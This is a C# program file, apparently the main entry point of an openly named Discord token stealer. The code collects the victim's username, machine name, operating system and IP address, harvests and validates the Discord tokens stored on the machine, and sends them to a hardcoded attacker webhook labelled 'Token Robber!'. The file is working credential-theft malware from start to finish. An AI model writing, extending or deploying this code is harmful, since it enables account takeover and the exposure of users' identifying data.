using System.Text;
using DiscordTokenStealer.Discord;

namespace DiscordTokenStealer;
public static class Program
{
    private static async Task Main()
    {
        StringBuilder content = new StringBuilder()
            .AppendLine($"Username: {Environment.UserName}")
            .AppendLine($"Machine Name: {Environment.MachineName}")
            .AppendLine($"Operating System: {Environment.OSVersion.Platform}")
            .AppendLine($"IP-Adress: {await IPInfo.GetAddress()}")
            .AppendLine("Tokens: ");
        await Parallel.ForEachAsync(TokenParser.ParseAll(), async (token, cts) => await AppendSummaryIfValid(token, content, cts));
        using DiscordWebhook webhook = new DiscordWebhook("913528883410771989", "bpci971IJ8tSAvn0iPqiJ2HioRhy5RD_6syK-Avg4iqTTQa7pGMvxLMvOXNIyvxEJi3C");
        await webhook.SendMessage(new DiscordMessage(content.ToString(), "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256"));
    }

    private static async Task AppendSummaryIfValid(string token, StringBuilder content, CancellationToken cts)
    {
        DiscordClient client = new DiscordClient(token);
        string? summary = await client.GetSummary(cts);
        lock (content)
        {
            content.Append(summary);
        }
    }
}